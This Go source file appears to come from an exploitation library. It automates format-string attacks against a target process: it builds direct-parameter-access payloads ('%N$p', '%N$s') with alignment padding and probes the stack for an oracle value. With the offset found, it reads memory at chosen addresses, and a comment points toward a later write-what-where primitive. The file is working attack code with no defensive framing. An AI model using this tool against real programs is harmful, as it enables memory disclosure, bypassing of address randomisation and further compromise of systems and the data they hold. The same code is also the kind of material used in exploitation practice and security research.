package memory

import (
	"bytes"
	"fmt"
	"log"
	"strconv"
	"strings"
)

type ProcessIO interface {
	WriteLine(p []byte) error
	ReadUntil(p []byte) ([]byte, error)
}

type FormatStringDPAConfig struct {
	ProcessIOFn  func() ProcessIO
	MaxNumParams int
	PointerSize  int
	Verbose      *log.Logger
}

func (o FormatStringDPAConfig) validate() error {
	if o.ProcessIOFn == nil {
		return fmt.Errorf("get process function cannot be nil")
	}

	if o.MaxNumParams <= 0 {
		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
	}

	if o.PointerSize <= 0 {
		return fmt.Errorf("pointer size in bytes must be greater than 0")
	}

	return nil
}

func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStringLeaker {
	f, err := SetupFormatStringLeakViaDPA(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
	}
	return f
}

func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
	dpaLeakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(config)
	if err != nil {
		return nil, err
	}

	return &FormatStringLeaker{
		procIOFn:  config.ProcessIOFn,
		builder:   dpaLeakConfig.builder.fmtStrBuilder,
		formatStr: dpaLeakConfig.builder.build(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
	}, nil
}

// In the future, this could be used to setup a write-what-where format
// string. This function was created by accident (it could have remained
// a part of the original function).
func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (*dpaLeakConfig, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	dpaBuilder := dpaFormatStringBuilder{
		fmtStrBuilder: formatStringBuilder{
			prefixAndSuffix:  []byte("|"),
			endOfStringDelim: []byte("foozlefu"),
			pointerSize:      config.PointerSize,
		},
	}

	specifier := []byte("p")
	fmtStrBuff := bytes.NewBuffer(nil)
	dpaBuilder.buildUnaligned(config.MaxNumParams, specifier, fmtStrBuff)
	memoryAlignedLen := stringMemoryAlignedLen(fmtStrBuff.Bytes(), config.PointerSize)

	if config.Verbose != nil {
		config.Verbose.Printf("format string config: %+v\nmemory aligned len: %d\nstring w/o padding: '%s'",
			dpaBuilder, memoryAlignedLen, fmtStrBuff.Bytes())
	}

	// TODO: Randomize oracle string instead of A's.
	oracle := strings.Repeat("A", config.PointerSize)
	oracleBytes := []byte(oracle)

	// TODO: Some platforms do not include '0x' in the format
	//  function's output.
	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))

	i := 0
	for ; i < config.MaxNumParams; i++ {
		addressFromFormatFunc, err := leakDataWithFormatString(
			config.ProcessIOFn(),
			append(dpaBuilder.build(i, specifier, memoryAlignedLen), oracleBytes...),
			dpaBuilder.fmtStrBuilder)
		if err != nil {
			return nil, err
		}

		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
			return &dpaLeakConfig{
				paramNum: i,
				alignLen: memoryAlignedLen,
				builder:  dpaBuilder,
			}, nil
		}
	}

	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
}

type dpaLeakConfig struct {
	paramNum int
	alignLen int
	builder  dpaFormatStringBuilder
}

type dpaFormatStringBuilder struct {
	fmtStrBuilder formatStringBuilder
}

// The resulting string is going to look like this:
//     [padding][format-string-with-loop-index][address]
//
// The "padding" is required because of the format
// string parameter specifier. As it grows, it could
// potentially mess up the alignment of the stack,
// which will make finding the oracle very difficult.
func (o dpaFormatStringBuilder) build(paramNumber int, specifiers []byte, alignmentLen int) []byte {
	temp := bytes.NewBuffer(nil)
	o.buildUnaligned(paramNumber, specifiers, temp)
	return o.fmtStrBuilder.build(alignmentLen, temp)
}

func (o dpaFormatStringBuilder) buildUnaligned(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
	o.fmtStrBuilder.appendInitial(buff)
	o.appendDirectParamAccessSpecifier(paramNumber, specifiers, buff)
	o.fmtStrBuilder.appendEnd(buff)
}

func (o dpaFormatStringBuilder) appendDirectParamAccessSpecifier(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(paramNumber))
	buff.WriteByte('$')
	if len(specifiers) > 0 {
		buff.Write(specifiers)
	}
}

type formatStringBuilder struct {
	prefixAndSuffix  []byte
	endOfStringDelim []byte
	pointerSize      int
}

func (o formatStringBuilder) isSuitableForLeaking() error {
	if len(o.prefixAndSuffix) == 0 {
		return fmt.Errorf("prefix and suffix field cannot be empty")
	}
	return nil
}

func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
	return prependStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
}

func (o formatStringBuilder) appendInitial(buff *bytes.Buffer) {
	buff.Write(o.prefixAndSuffix)
}

func (o formatStringBuilder) appendEnd(buff *bytes.Buffer) {
	buff.Write(o.prefixAndSuffix)
	buff.Write(o.endOfStringDelim)
}

type FormatStringLeaker struct {
	formatStr []byte
	builder   formatStringBuilder
	procIOFn  func() ProcessIO
}

func (o FormatStringLeaker) FormatString() []byte {
	return o.formatStr
}

func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
	p, err := o.MemoryAt(pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
	}
	return p
}

func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.builder)
}

func NewFormatStringDPALeakerOrExit(config FormatStringDPAConfig) *FormatStringDPALeaker {
	res, err := NewFormatStringDPALeaker(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
	}
	return res
}

func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALeaker, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	dpaBuilder := dpaFormatStringBuilder{
		fmtStrBuilder: formatStringBuilder{
			prefixAndSuffix:  []byte("|"),
			endOfStringDelim: []byte("foozlefu"),
			pointerSize:      config.PointerSize,
		},
	}

	unalignedBuff := bytes.NewBuffer(nil)
	dpaBuilder.buildUnaligned(config.MaxNumParams, []byte("p"), unalignedBuff)

	return &FormatStringDPALeaker{
		config:     config,
		dpaBuilder: dpaBuilder,
		alignedLen: stringMemoryAlignedLen(unalignedBuff.Bytes(), config.PointerSize),
	}, nil
}

type FormatStringDPALeaker struct {
	config     FormatStringDPAConfig
	dpaBuilder dpaFormatStringBuilder
	alignedLen int
}

func (o FormatStringDPALeaker) FindParamNumberOrExit(target []byte) (int, bool) {
	i, b, err := o.FindParamNumber(target)
	if err != nil {
		defaultExitFn(err)
	}
	return i, b
}

func (o FormatStringDPALeaker) FindParamNumber(target []byte) (int, bool, error) {
	for i := 0; i < o.config.MaxNumParams; i++ {
		result, err := o.MemoryAtParam(i)
		if err != nil {
			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
				i, err)
		}

		if o.config.Verbose != nil {
			o.config.Verbose.Printf("FindParamNumber read: '%s'", result)
		}

		if bytes.Equal(target, result) {
			if o.config.Verbose != nil {
				o.config.Verbose.Printf("FindParamNumber found target: '%s'", target)
			}
			return i, true, nil
		}
	}

	return 0, false, nil
}

func (o FormatStringDPALeaker) MemoryAtParamOrExit(paramNumber int) []byte {
	res, err := o.MemoryAtParam(paramNumber)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
	}
	return res
}

func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
	if paramNumber > o.config.MaxNumParams {
		// This is a problem because it may potentially shift
		// the arguments on the stack, and make the result
		// of the format string function unpredictable.
		return nil, fmt.Errorf("requested parameter number %d exceeds maximum params of %d",
			paramNumber, o.config.MaxNumParams)
	}

	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.dpaBuilder.fmtStrBuilder)
}

func (o FormatStringDPALeaker) FormatString(paramNum int) []byte {
	return o.dpaBuilder.build(paramNum, []byte{'p'}, o.alignedLen)
}

func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringBuilder) ([]byte, error) {
	err := info.isSuitableForLeaking()
	if err != nil {
		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
	}

	err = process.WriteLine(formatStr)
	if err != nil {
		return nil, fmt.Errorf("failed to write format string to process - %w", err)
	}

	token, err := process.ReadUntil(info.endOfStringDelim)
	if err != nil {
		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
	}

	firstSepIndex := bytes.Index(token, info.prefixAndSuffix)
	if firstSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
	}

	lineWithoutFirstSep := token[firstSepIndex+1:]
	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.prefixAndSuffix)
	if lastSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
	}

	return lineWithoutFirstSep[0:lastSepIndex], nil
}

func stringMemoryAlignedLen(stringWithoutPadding []byte, pointerSizeBytes int) int {
	maxStringLen := len(stringWithoutPadding)
	padLen := 0
	for {
		if (maxStringLen + padLen) % pointerSizeBytes == 0 {
			break
		}
		padLen++
	}
	return padLen + maxStringLen
}

func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
}
